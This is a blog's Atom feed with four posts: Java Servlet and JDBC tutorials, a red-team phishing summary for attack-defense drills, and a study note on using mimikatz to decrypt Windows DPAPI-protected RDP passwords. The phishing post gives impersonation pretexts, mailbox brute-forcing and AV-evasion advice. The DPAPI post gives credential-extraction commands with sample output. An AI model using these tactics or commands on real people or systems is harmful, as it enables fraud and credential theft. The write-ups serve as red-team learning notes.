<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sriracha :)</title>
  
  <subtitle>Wow, the smell is great!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://sherlocz.github.io/"/>
  <updated>2020-07-05T07:44:35.739Z</updated>
  <id>http://sherlocz.github.io/</id>
  
  <author>
    <name>sher10ck</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>IDEA新建Servlet</title>
    <link href="http://sherlocz.github.io/2020/07/05/IDEA%E6%96%B0%E5%BB%BAServlet/"/>
    <id>http://sherlocz.github.io/2020/07/05/IDEA新建Servlet/</id>
    <published>2020-07-05T06:28:48.000Z</published>
    <updated>2020-07-05T07:44:35.739Z</updated>
    
    <content type="html"><![CDATA[<p>Servlet为Server Applet，即服务器在启动时会运行的小程序。</p><p>通俗点说就是，Servlet本身就是一个接口，这个接口里面定义了会被tomcat容器解析的规则，那么我们若新建一个类，里面复写了servlet的方法，就可以被tomcat解析出来。</p><h1 id="IDEA与Tomcat联动"><a href="#IDEA与Tomcat联动" class="headerlink" title="IDEA与Tomcat联动"></a>IDEA与Tomcat联动</h1><p>点击Run—&gt;Debug-&gt;Edit Configuaration-&gt;+(Add New Comfiguaration)<br>选中Tomcat-&gt;local，箭头处选中你Tomcat安装的路径Apply保存。<br><img src="/2020/07/05/IDEA新建Servlet/tomcat.png" alt></p><p>然后File-&gt;New Module，新建一个Web Application<br><img src="/2020/07/05/IDEA新建Servlet/web.png" alt></p><p>新建好之后目录结构如下：<br><img src="/2020/07/05/IDEA新建Servlet/ok.png" alt></p><p>点击Shift+F10运行起来，这个时候我们的index.jsp被成功运行起来了<br><img src="/2020/07/05/IDEA新建Servlet/8888.png" alt></p><p>箭头所示的地方可以自定义我们访问的url路径。<br><img src="/2020/07/05/IDEA新建Servlet/url.png" alt></p><h1 id="创建Servlet"><a href="#创建Servlet" class="headerlink" title="创建Servlet"></a>创建Servlet</h1><p>首先我们在src目录下新建一个包，然后新建一个ServletDemo.class，代码如下：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package cn.s1.web.servlet;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class ServletDemo implements Servlet &#123;</span><br><span class="line">/*Servlet初始化时运行，只运行一次*/</span><br><span class="line">    @Override</span><br><span class="line">    public void init(ServletConfig servletConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">/*获取servlet的配置信息*/</span><br><span class="line">    @Override</span><br><span class="line">    public ServletConfig getServletConfig() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">/*每次servlet被访问时运行一次*/</span><br><span class="line">    @Override</span><br><span class="line">    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;Hello Servlet!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">/*获取servlet的一些信息*/</span><br><span class="line">    @Override</span><br><span class="line">    public String getServletInfo() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">/*在服务器关闭的时候运行*/</span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></p><p>首先我们需要将这个类implements Servlet，由于Servlet这个接口有抽象类的方法，我们在集成的时候需要重写，这里我重写service这个方法输出了一行字。</p><p>然后我们需要配置web.xml，在其中设置好我们servlet的路径和解析的类。<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span><br><span class="line">         version=&quot;3.1&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">//设置servlet名称</span><br><span class="line">        &lt;servlet-name&gt;Demo&lt;/servlet-name&gt;</span><br><span class="line">//设置对应的class类</span><br><span class="line">        &lt;servlet-class&gt;cn.s1.web.servlet.ServletDemo&lt;/servlet-class&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;Demo&lt;/servlet-name&gt;</span><br><span class="line">//Demo这个servlet解析时候需要访问的url地址</span><br><span class="line">        &lt;url-pattern&gt;/Demo&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></div></figure></p><p>这个时候我们再运行该项目，访问<a href="http://localhost:8888/Demo，结果如下：" target="_blank" rel="noopener">http://localhost:8888/Demo，结果如下：</a><br><img src="/2020/07/05/IDEA新建Servlet/url.png" alt><br>结果为空白，我们看控制台输出的信息：<br><img src="/2020/07/05/IDEA新建Servlet/hello.png" alt></p><p>和我们重写的service方法打印的字符串一样，说明创建成功！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Servlet为Server Applet，即服务器在启动时会运行的小程序。&lt;/p&gt;
&lt;p&gt;通俗点说就是，Servlet本身就是一个接口，这个接口里面定义了会被tomcat容器解析的规则，那么我们若新建一个类，里面复写了servlet的方法，就可以被tomcat解析出来。&lt;
      
    
    </summary>
    
    
    
      <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>JAVA学习-JDBC</title>
    <link href="http://sherlocz.github.io/2020/07/04/JAVA%E5%AD%A6%E4%B9%A0-JDBC/"/>
    <id>http://sherlocz.github.io/2020/07/04/JAVA学习-JDBC/</id>
    <published>2020-07-04T02:23:06.000Z</published>
    <updated>2020-07-09T08:39:12.793Z</updated>
    
    <content type="html"><![CDATA[<p>jdbc-mysql驱动下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dev.mysql.com/downloads/connector/j/5.1.html</span><br></pre></td></tr></table></figure></p><p>eclipse启动，在项目目录下新建一个Libs文件夹，将我们下载的mysql-connector-java.jar包放在这个文件夹中，文件结构如下：<br><img src="/2020/07/04/JAVA学习-JDBC/tree.png" alt></p><p>详细代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package cn.sl.jdbc;</span><br><span class="line"></span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.DriverManager;</span><br><span class="line">import java.sql.ResultSet;</span><br><span class="line">import java.sql.Statement;</span><br><span class="line"></span><br><span class="line">public class JdbcDemo &#123;</span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">//导入驱动jar包</span><br><span class="line">//注册驱动</span><br><span class="line">Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</span><br><span class="line">//获取连接对象</span><br><span class="line">Connection con = DriverManager.getConnection(&quot;jdbc:mysql:///tbtest&quot;, &quot;root&quot;, &quot;root&quot;);</span><br><span class="line">//定义sql语句</span><br><span class="line">//String updatesql = &quot;update info set phone = 15784561236 where name = &apos;admin&apos;&quot;;</span><br><span class="line">String selectsql = &quot;select * from info&quot;;</span><br><span class="line">//获取执行sql语句的对象</span><br><span class="line">Statement stmt = con.createStatement();</span><br><span class="line">//执行sql语句</span><br><span class="line">ResultSet rs  = stmt.executeQuery(selectsql);</span><br><span class="line">//int count = stmt.executeUpdate(updatesql);</span><br><span class="line">//处理结果</span><br><span class="line">rs.next();</span><br><span class="line">System.out.println(rs.getString(1));</span><br><span class="line">//System.out.println(count);</span><br><span class="line">//释放</span><br><span class="line">stmt.close();</span><br><span class="line">con.close();</span><br><span class="line">rs.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="DriverManager-驱动管理对象"><a href="#DriverManager-驱动管理对象" class="headerlink" title="DriverManager(驱动管理对象)"></a>DriverManager(驱动管理对象)</h2><p>通过查看com.mysql.jdbc.Driver的源码我们发现，Driver类中存在静态代码块，利用了registerDriver来注册驱动：<br><img src="/2020/07/04/JAVA学习-JDBC/static.png" alt></p><h2 id="Connection-数据库连接对象"><a href="#Connection-数据库连接对象" class="headerlink" title="Connection(数据库连接对象)"></a>Connection(数据库连接对象)</h2><h2 id="Statement-执行sql的对象"><a href="#Statement-执行sql的对象" class="headerlink" title="Statement(执行sql的对象)"></a>Statement(执行sql的对象)</h2><h2 id="ResultSet-封装查询结果"><a href="#ResultSet-封装查询结果" class="headerlink" title="ResultSet(封装查询结果)"></a>ResultSet(封装查询结果)</h2><p>next():游标向下移动一行<br>getXxx():获取数据(如getInt()/getString())</p><h2 id="PreparedStatement-执行sql语句的对象"><a href="#PreparedStatement-执行sql语句的对象" class="headerlink" title="PreparedStatement(执行sql语句的对象)"></a>PreparedStatement(执行sql语句的对象)</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;jdbc-mysql驱动下载：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class
      
    
    </summary>
    
    
    
      <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>钓鱼小结</title>
    <link href="http://sherlocz.github.io/2020/06/24/%E9%92%93%E9%B1%BC%E5%B0%8F%E7%BB%93/"/>
    <id>http://sherlocz.github.io/2020/06/24/钓鱼小结/</id>
    <published>2020-06-24T09:15:32.000Z</published>
    <updated>2020-07-02T12:16:31.383Z</updated>
    
    <content type="html"><![CDATA[<p>攻防演练中，有的时候我们很难产出大量的Web漏洞达到我们想要的效果，这个时候若目标企业员工安全意识薄弱，钓鱼是个非常好的选择。</p><p><img src="/2020/06/24/钓鱼小结/封面.jpg" alt></p><h1 id="钓鱼突破口选择"><a href="#钓鱼突破口选择" class="headerlink" title="钓鱼突破口选择"></a>钓鱼突破口选择</h1><ul><li>QQ(群)钓鱼</li><li>微信(群)钓鱼</li><li>在线客服钓鱼</li><li>邮件钓鱼</li><li>电话钓鱼</li><li>内部通信工具钓鱼(企业微信、内部邮箱、飞秋、自研通讯工具等)</li></ul><p>只要是能和目标员工交流的地方，都可以是我们选择的突破口</p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>前期的准备是为了让我们有充足的时间去思考会发生的各种问题，针对性的制作免杀木马、制定钓鱼计划、选择钓鱼对象等，这里我分了以下需要注意的点。</p><ul><li><p>调研内部安全设备部署情况<br>内部员工使用的聊天工具、电脑防护软件、服务器防护设备、是否使用云桌面、是否部署EDR、流量监测等安全设备…</p></li><li><p>整理内部组织架构、部门领导相关信息<br>冒充领导去给员工发送信息，中招率会很高，问题是如何拿到呢？前期我们可以通过github、社工库看下有没有邮箱的账号密码泄露，用pop/smtp去爆破邮箱弱口令(Web端爆破可能会触发告警)，想尽一切办法搞到一个邮箱，登陆邮箱之后组织架构、姓名、联系方式就非常清楚了。要是不知道邮箱账号，可以Chinese Top 1000 User Name跑一波，每个公司总会有zhangwei/liwei/zhangjie这样的员工吧。</p></li><li><p>社交账号伪装公司员工<br>常见的就是QQ/Wechat，修改姓名、头像、个人说明为相关公司的员工信息、QQ照片墙改成名片，找到一个员工，他是怎么写的，你可以改成一模一样的，这样方便加群，沟通让对方放松警惕，之前社交账号改成了一个公司的经理，居然会有同事会主动加好友和你聊天的。也可以伪装成好看的妹纸:)</p></li><li><p>提前潜伏目标企业内部群<br>很多公司都会开放对外的客服群、售后群、活动群甚至内部员工群、公司群，我们通过QQ或者其他社交软件多多少少都是可以搜索到的，伪装成员工、想办法进一个，只要群里有目标公司的员工，那么就是演练时的一个突破口。最好提前一段时间(一个月)潜伏在群里，攻防演练的时候很有可能意识会很强，不会随意让加群。<br><img src="/2020/06/24/钓鱼小结/QQ群.png" alt></p></li><li><p>免杀马<br>若是能调研出内部防护设备(如360、symantec)，我们就可以针对性的制作免杀马，只要不报毒就ok了。一旦被发现邮件或者你发送的文件有毒，可能会引起对方的警觉，说不定通知到上级，全公司通报一下不要点恶意程序、防范钓鱼攻击，哦豁，后面就真的没人点了(实战中确实遇到过这种情况)。</p></li><li><p>钓鱼邮件<br>邮服搭建网上有很多相关的开源脚本，可以github一波，准备一个伪装的域名，比方说com/com.cn/co结尾的域名都是ok的，像xyz/top/me这样结尾的域名真的很容易被人认出来。而且很多时候我们发送的邮件由于网关的垃圾处理机制会拒收或者放在垃圾箱里，也不知道真实情况是啥，为了避免拒收或者发送失败可以搞一个ssl证书。还有就是邮件正文，最好能够知道内部常用的术语、称呼、签名格式，针对性的去写邮件的标题和正文，当你添加木马附件的时候，最好加个解压密码。<br>这里推荐两个邮服搭建的网站：<br><a href="https://www.iredmail.com/" target="_blank" rel="noopener">https://www.iredmail.com/</a><br><a href="http://www.ewomail.com/" target="_blank" rel="noopener">http://www.ewomail.com/</a></p></li></ul><p>上面啰嗦了一堆，你也可以直接看下面的导图：<br><img src="/2020/06/24/钓鱼小结/钓鱼准备.png" alt></p><h1 id="诱导"><a href="#诱导" class="headerlink" title="诱导"></a>诱导</h1><p>钓鱼的最终目的就是为了让对方点击我们精心构造好的木马（前期应做好相应的准备），毕竟我们还是和人打交道，可以和对方玩心理战。这里举几个例子：</p><ul><li><p>伪装客户诱导客服<br>你们的xxx系统/app无法登陆，我发个截图给你们看吧！<br>请你们配合我的工作！不要耽误我的时间！</p></li><li><p>伪装运维人员诱导员工<br>你好，我是(信息)安全/管理部门的xxx，后台监测到您的电脑触发了告警，请使用我们提供的工具进行清理。<br>你好，我们后台监控到您的vpn存在异常，请提供账号密码（验证码）！情况紧急！</p></li></ul><ul><li><p>伪装上级诱导下属员工<br>我给你发了个表格，尽快帮我整理好，等会开会需要。</p></li><li><p>伪装钓鱼邮件被发现，进行回击<br>再发一封邮件：《关于近期收到钓鱼邮件应对措施》<br>由于近期钓鱼事件频发，为了避免公司内部网络木马感染，请运行公司下发的清理程序。<br>后台会实时监控您是否运行了程序，纳入绩效考核！请立即运行程序清理！</p></li></ul><p>多尝试几个人，一个客服不行换一个客服，一个员工不点再多换几个，大胆的尝试，问题不大。</p><h1 id="后期整理"><a href="#后期整理" class="headerlink" title="后期整理"></a>后期整理</h1><p>后期需要对钓鱼的人员、获取的信息、木马的名称、邮箱的附件进行统计，方便后续的复盘以及清理。</p><p>复盘的时候总结出现的问题，避免下次犯同样的错误。</p><p>文章写得比较随意，基本上想到哪里就写到哪里，我们在实际钓鱼的过程当中依然可能会出现各种各样奇妙的问题，比方说员工电脑不出网、木马掉线、钓鱼邮件发送拦截等等等等，这个时候发挥聪明的小脑袋，有什么好的思路就去尝试吧~</p><p>实践是检验真理的唯一标准。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;攻防演练中，有的时候我们很难产出大量的Web漏洞达到我们想要的效果，这个时候若目标企业员工安全意识薄弱，钓鱼是个非常好的选择。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/06/24/钓鱼小结/封面.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h1 id=&quot;钓鱼突破口选择&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
    
      <category term="钓鱼" scheme="http://sherlocz.github.io/tags/%E9%92%93%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>DPAPI学习记录</title>
    <link href="http://sherlocz.github.io/2020/06/24/DPAPI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://sherlocz.github.io/2020/06/24/DPAPI学习记录/</id>
    <published>2020-06-24T08:14:28.000Z</published>
    <updated>2020-06-29T03:28:55.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是DPAPI"><a href="#什么是DPAPI" class="headerlink" title="什么是DPAPI"></a>什么是DPAPI</h1><p>DPAPI(Data Protection Application Programming Interface)是Microsoft为了数据保护提供的一个接口。</p><p>应用范围：</p><ul><li>IE、Chrome的登录表单自动完成</li><li>Powershell加密函数</li><li>Outlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。</li><li>FTP管理账户密码</li><li>共享资源文件夹的访问密码</li><li>无线网络帐户密钥和密码</li><li>远程桌面身份凭证</li></ul><h1 id="Master-Key-Files"><a href="#Master-Key-Files" class="headerlink" title="Master Key Files"></a>Master Key Files</h1><p>位置：<strong>%APPDATA%/Microsoft/Protect/%SID%</strong><br>这里我的虚拟机中的masterkeyfile name为：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">88536919-3ca5-4e31-a0ac-1ccf6eb94dda</span><br><span class="line">a94e3c00-08e5-4272-8648-f7a796159916</span><br></pre></td></tr></table></div></figure></p><p>由于该文件为受保护的，所以我们要勾选掉 <strong>隐藏受保护的操作系统文件</strong></p><p><img src="/2020/06/24/DPAPI学习记录/file.png" alt></p><p>master key file为二进制文件，可以获取文件中的Masterkey破解登陆密码，包含以下五个部分：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Header and system information</span><br><span class="line">User’s Master Key</span><br><span class="line">Local backup encryption key</span><br><span class="line">Unique CREDHIST file identifier</span><br><span class="line">Domain Master Key backup</span><br></pre></td></tr></table></div></figure></p><p>利用mimikatz对MasterKeyFile进行解析，这里只是解析格式：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # dpapi::masterkey /in:C:\Users\swag7\AppData\Roaming\Microsoft\Protect\S-1-5-21-3716468413-4174316740-3893867168-1001\88536919-3ca5-4e31-a0ac-1ccf6eb94dda</span><br><span class="line">**MASTERKEYS**</span><br><span class="line">  dwVersion          : 00000002 - 2</span><br><span class="line">  szGuid             : &#123;88536919-3ca5-4e31-a0ac-1ccf6eb94dda&#125;</span><br><span class="line">  dwFlags            : 00000005 - 5</span><br><span class="line">  dwMasterKeyLen     : 000000b0 - 176</span><br><span class="line">  dwBackupKeyLen     : 00000090 - 144</span><br><span class="line">  dwCredHistLen      : 00000014 - 20</span><br><span class="line">  dwDomainKeyLen     : 00000000 - 0</span><br><span class="line">[masterkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : 824e5853fe8cc89a609ea3d6fdf63b49</span><br><span class="line">    rounds           : 000043f8 - 17400</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : b1509914bf8fafaf32f0686555097ad5f6241061f2857972710a788b3c4dcce9733d7ae5fd45b7c3483a07321e6c0fb047cb06389b0567b6964c7382255d25c1a316a75c6839d7a516540a10c49941b02e3b7d08bcbca8c6ed4362469b9eafbbecca62ac20a03aa9ae739e23d67f2446a77b63b00166c2616ac31de9b59327afa6975f440bb735a95427413c1a209036</span><br><span class="line"></span><br><span class="line">[backupkey]</span><br><span class="line">  **MASTERKEY**</span><br><span class="line">    dwVersion        : 00000002 - 2</span><br><span class="line">    salt             : b9eba682e6a10a6eabe2a671f2a5f970</span><br><span class="line">    rounds           : 000043f8 - 17400</span><br><span class="line">    algHash          : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    algCrypt         : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    pbKey            : 07f73eaad338c8f205525bcd76883a9280e646b79fd93fef9b162aaeea97241a03dc6aa5b9f64734d20ad78b6f6d9d4c8aa79a8d03155116c61e5e514e5ed570847f81a2ca904085672de962c687614e72dc9cd62a5c5f2ac89e1643bf3b9612218a4bbe8bfe22304389f6fa155a9790</span><br><span class="line"></span><br><span class="line">[credhist]</span><br><span class="line">  **CREDHIST INFO**</span><br><span class="line">    dwVersion        : 00000003 - 3</span><br><span class="line">    guid             : &#123;bc99ef8c-8b47-4d3c-a316-2daba229d091&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auto SID from path seems to be: S-1-5-21-3716468413-4174316740-3893867168-1001</span><br></pre></td></tr></table></div></figure></p><h1 id="破解rdp密码"><a href="#破解rdp密码" class="headerlink" title="破解rdp密码"></a>破解rdp密码</h1><p>首先查看保存的rdp凭据：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /line</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/06/24/DPAPI学习记录/cmdkey.png" alt></p><p>windows保存rdp凭据的位置：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Local\Microsoft\Credentials</span><br></pre></td></tr></table></div></figure></p><p>我们可以查看该目录下的文件有啥：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\*</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 EA04-9FD7</span><br><span class="line"></span><br><span class="line"> C:\Users\swag7\AppData\Local\Microsoft\Credentials 的目录</span><br><span class="line"></span><br><span class="line">2020/06/29  11:04    &lt;DIR&gt;          .</span><br><span class="line">2020/06/29  11:04    &lt;DIR&gt;          ..</span><br><span class="line">2020/06/29  11:04               434 0584A81C75E5FE36C40B464C8CFBCD0F</span><br><span class="line">               1 个文件            434 字节</span><br><span class="line">               2 个目录 38,597,902,336 可用字节</span><br></pre></td></tr></table></div></figure></p><p>用管理员权限打开mimikatz，先提个权限：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></div></figure></p><p>解析rdp凭证文件：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\0584A81C75E5FE36C40B464C8CFBCD0F</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/06/24/DPAPI学习记录/cred.png" alt></p><p>获取到guidMasterKey，这里的gmk其实就是我们的master key file名称，位置就在<strong>%APPDATA%/Microsoft/Protect/%SID%</strong>下</p><p>其实这里可以直接用mimikatz读取所有masterkeyfile对应的masterkey，使用命令：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/06/24/DPAPI学习记录/sekurlsa.png" alt><br>这里其实mimikatz已经将masterkey放入缓存中，下次我们读取cred文件的时候mimikatz会直接利用masterkey进行解密。</p><p>我们再运行命令<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\0584A81C75E5FE36C40B464C8CFBCD0F</span><br></pre></td></tr></table></div></figure></p><p>结果如下，成功读取远程密码：<br><img src="/2020/06/24/DPAPI学习记录/08067.png" alt></p><p>查看dpapi缓存：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cache</span><br></pre></td></tr></table></div></figure></p><p><img src="/2020/06/24/DPAPI学习记录/cache.png" alt></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/</a></p><p><a href="https://xz.aliyun.com/t/6508" title="通过Dpapi获取Windows身份凭证" target="_blank" rel="noopener">https://xz.aliyun.com/t/6508</a></p><p><a 